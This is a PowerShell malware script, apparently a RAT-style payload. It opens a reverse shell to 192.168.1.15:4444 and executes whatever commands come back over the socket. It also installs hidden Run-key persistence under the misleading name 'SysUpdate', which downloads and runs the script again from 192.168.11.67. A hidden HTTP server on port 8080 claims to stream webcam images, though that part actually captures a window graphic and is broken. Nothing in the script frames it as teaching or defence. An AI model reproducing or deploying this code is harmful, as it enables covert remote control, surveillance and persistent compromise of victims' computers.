# shell.ps1 v4 - REVERSE SHELL + WEBCAM ONLY
$a = "System.Net.Sockets."; $b = "TCPClient"; $c = New-Object ($a + $b)("192.168.1.15", 4444); $s = $c.GetStream(); [byte[]]$b_arr = 0..65535|%{0}; $m = ([text.encoding]::ASCII).GetBytes("WEBCAM READY`n"); $s.Write($m,0,$m.Length);

# Persistence
$regcmd = 'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(`"http://192.168.11.67/shell.ps1`")"';
New-Item 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Force -ErrorAction SilentlyContinue | Out-Null;
Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SysUpdate' -Value $regcmd -Force -ErrorAction SilentlyContinue;

# WEBCAM HTTP SERVER (separate process - NO BLOCKING)
Start-Process powershell -WindowStyle Hidden -ArgumentList "-nop","-c","Add-Type -A 'System.Drawing';`$l=New-Object System.Net.HttpListener;`$l.Prefixes.Add('http://*:8080/');`$l.Start();while(`$l.IsListening){`$ctx=`$l.GetContext();if(`$ctx.Request.Url.AbsolutePath -eq '/webcam'){[System.Reflection.Assembly]::LoadWithPartialName('System.Drawing')|Out-Null;Add-Type -A 'System.Windows.Forms';`$cam=New-Object System.Drawing.Imaging.Metafile([System.IO.Stream][System.IO.MemoryStream]::new(),[System.Drawing.Graphics]::FromHwnd((Get-Process -name explorer).MainWindowHandle));`$bmp=New-Object System.Drawing.Bitmap(640,480);`$g=[System.Drawing.Graphics]::FromImage(`$bmp);`$g.DrawImage(`$cam,0,0,640,480);`$ms=New-Object IO.MemoryStream;`$bmp.Save(`$ms,[System.Drawing.Imaging.ImageFormat]::Jpeg);`$ctx.Response.ContentType='image/jpeg';`$ctx.Response.ContentLength64=`$ms.Length;`$ms.WriteTo(`$ctx.Response.OutputStream)}else{`$ctx.Response.ContentType='text/html';`$body=[Text.Encoding]::UTF8.GetBytes('<h1>WEBCAM</h1><img src=/webcam width=640 height=480><br><a href=/webcam>Refresh</a>');`$ctx.Response.ContentLength64=`$body.Length;`$ctx.Response.OutputStream.Write(`$body,0,`$body.Length)};`$ctx.Response.Close()}"

# REVERSE SHELL LOOP - WILL CONNECT
while(($i = $s.Read($b_arr, 0, $b_arr.Length)) -ne 0){
    $d = [text.encoding]::ASCII.GetString($b_arr,0, $i); 
    $sb = try { Invoke-Expression $d 2>&1 | Out-String } catch { $_.Exception.Message }; 
    $out = $sb + "PS> "; 
    $m = ([text.encoding]::ASCII).GetBytes($out); 
    $s.Write($m,0,$m.Length); 
    $s.Flush()
}
$c.Close()
